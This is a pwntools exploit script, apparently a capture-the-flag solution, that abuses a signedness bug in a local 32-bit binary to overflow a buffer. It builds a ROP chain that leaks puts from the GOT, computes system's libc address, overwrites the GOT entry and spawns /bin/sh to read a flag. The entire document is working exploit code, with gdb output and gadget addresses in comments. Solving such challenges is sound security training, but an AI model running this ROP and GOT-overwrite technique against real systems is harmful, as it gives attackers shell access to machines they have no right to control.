from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')


'''
gdb-peda$ p puts
$1 = {<text variable, no debug info>} 0x80483e0 <puts@plt>
gdb-peda$ x/i 0x80483e0
   0x80483e0 <puts@plt>:	jmp    DWORD PTR ds:0x804a018
gdb-peda$ p read
$2 = {<text variable, no debug info>} 0x80483c0 <read@plt>
gdb-peda$ p &name
$3 = (<data variable, no debug info> *) 0x804a060 <name>

ROPgadget --binary ./cwe_195_c
0x08048649: pop esi ; pop edi ; pop ebp ; ret
'''

puts = 0x80483e0
got_puts = 0x804a018
read = 0x80483c0
name = 0x804a060
pppr = 0x08048649

s.recvuntil('whats your name?: ')
s.sendline('/bin/sh\x00')
s.recvuntil('32 \n')
s.sendline('44')
s.send('A'*56+p32(puts)+p32(pppr+2)+p32(got_puts)+p32(read)+p32(pppr)+p32(0)+p32(got_puts)+p32(4)+p32(puts)+p32(name)*2)
leak_puts = u32(s.recv(4))
leak_system = leak_puts-libc.symbols['puts']+libc.symbols['system']
print 'leak_puts: 0x%x'%leak_puts
print 'libc: 0x%x'%(leak_puts-libc.symbols['puts'])
s.send(p32(leak_system))

s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()

